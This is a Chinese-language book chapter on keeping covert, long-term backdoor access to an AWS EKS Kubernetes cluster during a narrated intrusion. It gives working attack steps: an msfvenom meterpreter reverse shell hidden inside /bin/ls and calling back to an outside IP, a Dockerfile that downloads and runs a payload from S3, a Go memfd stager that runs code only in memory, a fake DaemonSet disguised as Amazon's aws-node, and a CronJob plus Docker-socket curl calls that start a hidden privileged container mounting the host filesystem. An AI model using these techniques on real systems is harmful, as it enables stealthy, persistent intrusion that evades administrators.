# 第九章：粘性 Shell

![](img/chapterart.png)

在处理像 Kubernetes 这样的波动性和可再生基础设施时，持久性变得具有全新的意义。容器和节点往往被视为不可变且一次性使用的对象，随时可能消失。

这种波动性在 AWS 机器上因使用名为 *spot 实例* 的特殊类型而进一步加剧。以常规价格的约 40% 费用，公司可以启动几乎任何可用类型的 spot 实例。关键是，AWS 拥有在需要计算资源时随时收回机器的权力。虽然这种配置对于 Kubernetes 集群来说似乎是理想的，在这种集群中，容器可以自动迁移到健康的机器上，新节点在几秒钟内重新生成，但这确实给可靠的长期后门带来了新的挑战。

持久性曾经是通过植入二进制文件、在机器上运行秘密的 shell 以及植入安全 Shell (SSH) 密钥来实现的。这些方法在一个机器平均寿命只有几个小时的世界里，无法提供稳定的长期访问。

好消息是，使用 100% spot 实例来构建集群的风险如此之大，以至于没有任何严肃的公司会设置这样的集群——至少不会用于处理关键工作负载。如果 AWS 突然大幅回收资源，集群可能无法迅速扩展以满足客户需求。因此，一种常见的成本效益策略是在一组常规实例的基础上安排关键工作负载的稳定部分，并通过 spot 实例吸收流量波动。

对于这样一个波动的基础设施，一种懒惰的后门方式是定位这批珍贵的机器——它们通常是集群中最旧的机器——并使用老式方法给它们设置后门。我们可以设置一个定时任务，定期拉取并执行反向 shell。我们可以使用 *二进制植入*，即替换 `ls`、Docker 和 SSHD 等常用工具，使用能够执行远程代码、授予 root 权限并执行其他恶作剧操作的变体。我们还可以插入 *rootkit*，它指的是任何对系统（如库、内核结构等）的修改，允许或维持访问权限（你可以查看一个在 Linux 上的示例 rootkit：[`github.com/croemheld/lkm-rootkit/`](https://github.com/croemheld/lkm-rootkit/)）。

在列表 9-1 中，我们获取机器并按创建时间戳对它们进行排序。

```
shell> `./kubectl get nodes –sort-by=.metadata.creationTimestamp`

Name
ip-192-168-162-15.eu-west-1....   Ready  14 days
ip-192-168-160-34.eu-west-1....   Ready  14 days
ip-192-168-162-87.eu-west-1....   Ready  14 days
ip-192-168-162-95.eu-west-1....   Ready  12 days
ip-192-168-160-125.eu-west-1....  Ready   9 days
`--snip--`
```

列表 9-1：查找最旧的节点，以定位集群中的稳定部分

每个节点支持不同的服务，因此对这些节点进行后门攻击，至少能确保我们有几天的访问权限。然后，shell 会随着节点的消失而自动消失，埋葬我们所有的痕迹。这简直是完美的犯罪。

但是，如果几天的时间还不足以找到侵入 Gretsch Politico 网络的方法呢？我们能否以某种方式保持更长时间的访问？毕竟，我们正处于一个可以自我适应和自我修复的环境中。如果它修复了我们的后门，那不就是一种奇迹吗？

如果我们开始把后门看作一个容器或一个 Pod，那么也许我们可以利用 Kubernetes 的黑暗魔法，确保至少有一个副本始终在某个地方运行。然而，这种雄心壮志的风险不能掉以轻心。Kubernetes 提供了关于其所有组件的荒谬级别的洞察和指标，因此使用一个实际的 Kubernetes Pod 作为我们的后门，会让我们保持低调变得有些棘手。

持久性始终是权衡的游戏。我们是应该为了更持久的访问牺牲隐秘性，还是保持非常低的曝光度，接受在最轻微的波动下失去辛苦获得的 shell？对于这个问题，每个人都有不同的看法，这将取决于多个因素，比如他们对攻击基础设施匿名性的信心、目标的安全等级、风险承受能力等等。

然而，这个表面上看似不可能的难题有一个显而易见的解决方案：具有不同属性的多个后门。我们将同时拥有一个稳定而略显普通的后门和一个隐秘但不稳定的 shell。第一个后门将由一个巧妙隐藏在眼前的 Pod 组成，它作为我们的主要操作中心。这个 Pod 将定期向家中发送信号，寻找要执行的命令。这也提供了直接的互联网连接，而我们当前的 shell 缺乏这一点。无论因何种原因，它一旦被摧毁，Kube 将迅速将其恢复。与第一个后门并行，我们将部署另一个更隐秘的程序，直到我们发送一个预定义的信号，它才会恢复。这为我们提供了一个秘密的方式，万一我们的第一个后门被好奇的管理员发现，可以重新进入系统。

这些多个后门不应共享任何妥协的指示：它们将联系不同的 IP，使用不同的技术，运行不同的容器，并彼此完全隔离。一个调查员发现某个种子具有特定属性时，不应能够利用这些信息找到其他后门。从理论上讲，一个后门的失败不应使其他后门面临风险。

## 稳定访问

稳定的后门将能够，例如，在可用的数百个节点中的少数几个上运行。这个流氓容器将是一个精简的镜像，在启动时加载并执行一个文件。我们将使用 *Alpine*，一个大约 5MB 的最小化发行版，通常用于启动容器。

在 Listing 9-2 中，我们首先编写 Dockerfile 以在 Alpine 容器内下载并运行一个任意文件。

```
#Dockerfile

FROM alpine

CMD ["/bin/sh", "-c",
"wget https://amazon-cni-plugin-essentials.s3.amazonaws.com/run
-O /root/run && chmod +x /root/run && /root/run"]
```

Listing 9-2: 一个 Dockerfile，用于构建一个容器，在启动后下载并运行一个可执行文件

由于 MXR Ads 是 S3 的忠实粉丝，我们从我们拥有的一个 S3 存储桶中拉取未来的二进制文件，我们将其背叛性地命名为 amazon-cni-plugin-essentials（稍后会详细解释这个名称）。

该二进制文件（也称为*代理*）可以是你最喜欢的自定义或样板反向 shell。有些黑客甚至不介意在 Linux 主机上运行一个原生 meterpreter 代理。正如第一章所述，我们构建的攻击框架是可靠且稳定的，很少有公司愿意投资昂贵的端点检测响应解决方案来保护他们的 Linux 服务器，尤其是在 Kubernetes 集群中的短暂机器上。这使得像 Metasploit 这样的现成漏洞利用框架成为一个合理的选择。

尽管如此，我们还是保持谨慎，花费几秒钟构建一个可靠的负载，避免触发潜在的隐藏安全机制。

我们前往实验室并生成一个无阶段的原生 HTTPS meterpreter。无阶段负载是完全自包含的，不需要从互联网下载额外的代码来启动。meterpreter 直接注入我们选择的 ELF/PE 二进制文件的*.text*部分（前提是模板文件有足够的空间）。在列表 9-3 中，我们选择了*/bin/ls*二进制文件作为模板，并将反向 shell 嵌入其中。

```
root@Point1:~/# docker run -it phocean/msf ./msfvenom -p \
**linux/x64/meterpreter_reverse_https \**
**LHOST=54.229.96.173 \**
**LURI=/msf \**
**-x /bin/ls**
**LPORT=443 -f elf > /opt/tmp/stager**

[*] Writing 1046512 bytes to /opt/tmp/stager...
```

列表 9-3：将 meterpreter 嵌入常规的*/bin/ls*可执行文件中

很简单。现在，我们希望不是像传统二进制文件那样从磁盘运行该文件，而是仅通过内存触发其执行，以规避潜在的安全解决方案。如果负载是常规的 shellcode，而不是一个实际的二进制文件，我们只需要将其复制到一个可读/写/执行的内存页中，然后跳转到负载的第一个字节。

然而，由于我们的`meterpreter_reverse_https`负载生成一个完整的 ELF 二进制文件，反射地将其加载到内存中需要一些额外的工作：我们必须手动加载导入的 DLL 并解析本地偏移量。有关如何处理此问题的更多信息，请查看本章末尾的资源。幸运的是，Linux 3.17 引入了一个系统调用工具，它提供了一种更快速的方式来实现相同的结果：*memfd*。

此系统调用创建一个完全驻留在内存中的虚拟文件，并表现得像任何常规磁盘文件。通过使用虚拟文件的符号链接*/proc/self/fd/<id>*，我们可以打开虚拟文件，修改它，截断它，当然，也可以执行它！

以下是执行此操作的五个主要步骤：

1.  使用 XOR 操作加密原生 meterpreter 负载。

1.  将结果存储在 S3 存储桶中。

1.  创建一个下载加密负载的程序，该程序通过 HTTPS 在目标机器上执行。

1.  在内存中解密负载，并使用 memfd 系统调用初始化一个“匿名”文件。

1.  将解密后的负载复制到这个仅驻留在内存中的文件中，然后执行它。

列表 9-4 是我们的 stager 将执行的主要步骤的简化版——像往常一样，完整的代码托管在 GitHub 上。

```
func main() {
  // Download the encrypted meterpreter payload
  data, err := getURLContent(path)

  // Decrypt it using XOR operation
  decryptedData := decryptXor(data, []byte("verylongkey"))

  // Create an anonymous file in memory
  mfd, err := memfd.Create()

  // Write the decrypted payload to the file
  mfd.Write(decryptedData)

  // Get the symbolic link to the file
  filePath := fmt.Sprintf("/proc/self/fd/%d", mfd.Fd())

  // Execute the file
  cmd := exec.Command(filePath)
  out, err := cmd.Run()
}
```

列表 9-4：Stager 的高级操作

就这些了。我们不需要进行任何复杂的偏移计算、库热加载、程序链接表（PLT）段的修补或其他危险的技巧。我们有一个可靠的引导程序，它只在内存中执行文件，并且保证能够在任何最近的 Linux 发行版上运行。

我们编译代码，然后将其上传到 S3：

```
root@Point1:**opt/tmp/# aws s3api put-object \**
**--key run \**
**--bucket amazon-cni-plugin-essentials \**
**--body ./run**
```

最后，为了进一步增强骗局的网络，当我们构建容器的镜像并将其推送到我们自己的 AWS ECR 注册表时（ECR 相当于 AWS 上的 Docker Hub），我们是在伪装成一个合法的 Amazon 容器，即 amazon-k8s-cni：

```
root@Point1:~/# docker build \
**-t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .**

Successfully built be905757d9aa
Successfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3

# Authenticate to ECR
root@Point1:~/# $(aws ecr get-login --no-include-email --region eu-west-1)
root@Point1:~/# docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
```

假容器（amazon-k8s-cni）和 S3 存储桶（amazon-cni-plugin-essentials）的名称并非随意选择。EKS 在每个节点上运行一个类似的容器副本，用于管理 Pod 和节点的网络配置，正如我们从任何运行中的集群中获取的 Pod 列表所见：

```
shell> **kubectl get pods -n kube-system | grep aws-node**
aws-node-rb8n2            1/1     Running   0          7d
aws-node-rs9d1            1/1     Running   0          23h
`--snip--`
```

这些名为 aws-node-*xxxx* 的 Pod 正在运行托管在 AWS 自有仓库中的官方 `amazon-k8s-cni` 镜像。

这些 Pod 是由一个 *DaemonSet* 对象创建的，这是一个 Kubernetes 资源，确保在所有（或部分）节点上始终运行至少一个给定的 Pod 副本。每个这些 aws-node Pod 都分配了一个具有只读访问权限的服务帐户，可以访问所有命名空间、节点和 Pod。更重要的是，它们都自动挂载了 */var/run/docker.sock*，赋予它们对主机的 root 权限。这是一个完美的掩护。

我们将生成这个 DaemonSet 的几乎完全相同副本。然而，与真正的 DaemonSet 不同，这个新的 DaemonSet 将从我们自己的 ECR 仓库获取 `amazon-k8s-cni` Pod 镜像。默认情况下，DaemonSet 会在所有机器上运行。我们不希望出现成千上万的反向 shell 一次性回拨的情况，因此我们只会针对几个节点——例如，三个带有 “kafka-broker-collector” 标签的节点。这是我们邪恶 DaemonSet 的一个合适的目标群体。

以下命令显示机器名称及其标签：

```
shell> **kubectl get nodes --show-labels**

ip-192-168-178-150.eu-west-1.compute.internal

service=kafka-broker-collector,
beta.kubernetes.io/arch=amd64,
beta.kubernetes.io/instance-type=t2.small, beta.kubernetes.io/os=linux

ip-192-168-178-150.eu-west-1.compute.internal
`--snip--`
ip-192-168-178-150.eu-west-1.compute.internal
`--snip--`
```

我们已经选择了目标。我们的有效载荷已锁定并准备就绪。下一步是创建 DaemonSet 对象。

无需去寻找 DaemonSet 的 YAML 定义；我们直接导出合法的 aws-node 使用的 DaemonSet，更新容器镜像字段，使其指向我们自己的仓库，修改显示名称（将 aws-node 改为 aws-node-cni），更改容器端口以避免与现有 DaemonSet 的冲突，最后添加标签选择器以匹配 kafka-broker-collector。在 示例 9-5 中，我们重新提交了新修改的文件以进行调度。

```
shell> **kubectl get DaemonSet aws-node -o yaml -n kube-system > aws-ds-manifest.yaml**

# Replace the container image with our own image
shell> **sed -E "s/image: .*/image: 886477354405.dkr.ecr.eu-west-1.amazonaws.com/\**
**amazon-k8s-cni:v1.5.3/g" -i aws-ds-manifest.yaml**

# Replace the name of the DaemonSet
shell> **sed "s/ name: aws-node/ name: aws-node-cni/g" -i aws-ds-manifest.yaml**

# Replace the host and container port to avoid conflict
shell> **sed -E "s/Port: [0-9]+/Port: 12711/g" -i aws-ds-manifest.yaml**

# Update the node label key and value
shell> **sed "s/ key: beta.kubernetes.io\/os/ key: service/g" -i aws-ds-manifest.yaml**

shell> **sed "s/ linux/ kafka-broker-collector/g" -i aws-ds-manifest.yaml**
```

示例 9-5：创建我们自己的假 DaemonSet

经过几条 `sed` 命令后，我们准备好更新的清单，可以将其推送到 API 服务器。

与此同时，我们返回到我们的 Metasploit 容器，设置一个监听器，在端口 443 上提供类型为 `meterpreter_reverse_https` 的有效载荷，如下所示。这个有效载荷类型当然和我们在本章开始时使用的 `msfvenom` 命令中的类型是相同的：

```
root@Point1:~/# docker ps
CONTAINER ID      IMAGE          COMMAND
8e4adacc6e61      phocean/msf    "/bin/sh -c \"init.sh\""

root@Point1:~/# docker attach 8e4adacc6e61
root@fcd4030:/opt/metasploit-framework# ./msfconsole
msf > **use exploit/multi/handler**
msf multi/handler> **set payload linux/x64/meterpreter_reverse_https**
msf multi/handler> **set LPORT 443**
msf multi/handler> **set LHOST 0.0.0.0**
msf multi/handler> **set LURI /msf**
msf multi/handler> **set ExitOnSession false**
msf multi/handler> **run -j**
[*] Exploit running as background job 3
```

我们将这个更新后的清单推送到集群，它将创建 DaemonSet 对象和三个反向 shell 容器：

```
shell> **kubectl -f apply -n kube-system aws-ds-manifest.yaml**
daemonset.apps/aws-node-cni created

# Metasploit container

[*] https://0.0.0.0:443 handling request from 34.244.205.187;
meterpreter > **getuid**
Server username: uid=0, gid=0, euid=0, egid=0
```

太棒了。节点可能会崩溃，Pods 也可能会被清除，但只要有节点带有 kafka-collector-broker 标签，我们的恶意容器就会一次又一次地在它们上面被调度，复活我们的后门。毕竟，谁敢质疑那些明显与 EKS 集群关键组件相关的、看起来像是 Amazon 的 Pod 呢？虽然通过模糊安全性可能不是一种成功的防御策略，但它在进攻世界中是一条黄金法则。

## 隐秘的后门

我们的稳定后门非常坚韧，可以在节点终止时存活，但它有点显眼。Pod 和 DaemonSet 会持续运行，并在集群中可见。因此，我们通过一个更加隐秘的后门来补充它，这个后门只有在偶尔启动时才会激活。

我们在集群级别设置了一个 cron 任务，该任务每天上午 10 点执行，激活一个 Pod。我们将使用与 DaemonSet 中不同的 AWS 账户，确保我们的后门数据或技术不会相互共享。Listing 9-6 展示了 cron 任务的清单文件。

```
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: metrics-collect
spec:
  schedule: "0 10 * * *"
  jobTemplate:
 spec:
      template:
        spec:
          containers:
          - name: metrics-collect
            image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector
            volumeMounts:
            - mountPath: /var/run/docker.sock
              name: dockersock
          volumes:
          - name: dockersock
            hostPath:
              path: /var/run/docker.sock
          restartPolicy: Never
```

Listing 9-6: 我们的隐秘后门的定时任务

这个 cron 任务从我们控制的另一个 AWS 账户加载 `amazon-metrics-collector` 镜像。这个 Docker 镜像结构更为复杂，甚至可能被误认为是合法的度量任务（见 Listing 9-7）。

```
# Dockerfile

FROM debian: buster-slim

RUN apt update && apt install -y git make
RUN apt install -y prometheus-varnish-exporter
COPY init.sh /var/run/init.sh

ENTRYPOINT ["/var/run/init.sh"]
```

Listing 9-7: 一个 Dockerfile，安装多个软件包并在启动时执行脚本

在那些无用软件包和数十行虚假代码的表面下，我们在 *init.sh* 文件中深藏了一个指令，该指令会下载并执行托管在 S3 上的自定义脚本。最初，这个远程脚本将是一个无害的 `echo` 命令。当我们想要激活这个后门以重新获得系统访问时，我们将用我们自定义的 meterpreter 覆盖 S3 上的文件。它是一种潜伏的 shell，只有在紧急情况下才会使用。

然而，这种设置并不能完全解决原始问题的可见性问题。一旦我们激活了 shell，我们将在系统上有一个持续运行的 pod，Kube 管理员都能看到。

一项优化是避免直接在外部容器的 metrics-collector pod 上执行我们自定义的 stager。相反，我们将使用这个 pod 来联系我们方便挂载的 Docker 套接字，并指示它在主机上启动另一个容器，该容器最终会加载 meterpreter 代理。metrics-collector pod 在完成其工作后可以优雅地终止，而我们的 shell 将继续在其自己的第二个容器中不受干扰地运行。

这个第二个容器对于 Kubernetes 完全是不可见的，因为它没有像 ReplicaSet 或 DaemonSet 这样的现有对象作为附加项，而是由 Docker 在节点上顽固地创建的。这个容器将悄悄地以特权模式继续运行，几乎没有任何监督。列表 9-8 给出了通过 Docker API 拉取、创建和启动这样一个容器的三个 `curl` 命令。这个脚本应该由我们之前定义的 amazon-metrics-collector 容器加载并执行。

```
# Pull the image from the ECR registry
curl \
  --silent \
  --unix-socket /var/run/docker.sock \
  "http://docker/images/create?fromImage=881445392307.dkr.ecr.eu-west\
  -1.amazonaws.com/pause-amd64" \
  -X POST

# Create the container from the image and mount the / directory
curl \
  --silent \
  --unix-socket /var/run/docker.sock \
  "http://docker/containers/create?name=pause-go-amd64-4413" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{ "Image": "881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64",\
  "Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}'

# Start the container
curl \
  --silent \
  --unix-socket /var/run/docker.sock \
  "http://docker/containers/pause-go-amd64-4413/start" \
  -X POST \
  -H "Content-Type: application/json" \
  --output /dev/null \
  --write-out "%{http_code}"
```

列表 9-8：拉取新的 Docker 镜像、创建容器并启动的脚本

为了进一步掩盖我们的流氓容器，我们将它藏匿在通常在任何给定节点上运行的众多 *pause* *容器* 中。pause 容器在 Kubernetes 架构中扮演着关键角色，因为它是继承分配给 Pod 的所有命名空间，并与其中的容器共享的容器。每个 Pod 都有一个 pause 容器，因此再多一个几乎不会引起注意。

在此阶段，我们已经在 Kubernetes 集群中站稳了脚跟。我们可以继续在随机节点上启动进程，以防某人破坏我们的 Kube 资源，但希望到那时我们已经完成了我们的任务。

## 资源

+   关于 meterpreter 有效载荷的更多信息，请搜索 OJ Reeves 在 [`blog.rapid7.com/`](https://blog.rapid7.com/) 上发表的文章“深入探讨无阶段 meterpreter 有效载荷”。

+   如果想深入了解 `memcpy` 和 `mprotect` 在 Shellcode 执行中的强大作用，请阅读 Shivam Shrirao 的文章《让堆栈重新可执行》：[`bit.ly/3601dxh`](http://bit.ly/3601dxh)。

+   @nsxz 的 ReflectiveELFLoader 提供了一个概念验证：[`github.com/nsxz/ReflectiveELFLoader/`](https://github.com/nsxz/ReflectiveELFLoader/)。该代码文档完整，但需要一些 ELF 头部的知识；请参见 [`0x00sec.org/t/dissecting-and-exploiting-elf-files/7267/`](https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267/)。

+   关于 Linux 上仅内存执行方法的汇编可以在 [`bit.ly/35YMiTY`](http://bit.ly/35YMiTY) 找到。

+   Memfd 在 Linux 内核 3.17 中引入。请参阅 `memfd_create` 的手册页：[`bit.ly/3aeig27`](http://bit.ly/3aeig27)。

+   关于 DaemonSets 的更多信息，请参阅 Kubernetes 文档：[`bit.ly/2TBkmD8`](http://bit.ly/2TBkmD8)。

+   如需 Docker 帮助，请参阅 API 文档：[`dockr.ly/2QKr1ck`](https://dockr.ly/2QKr1ck)。
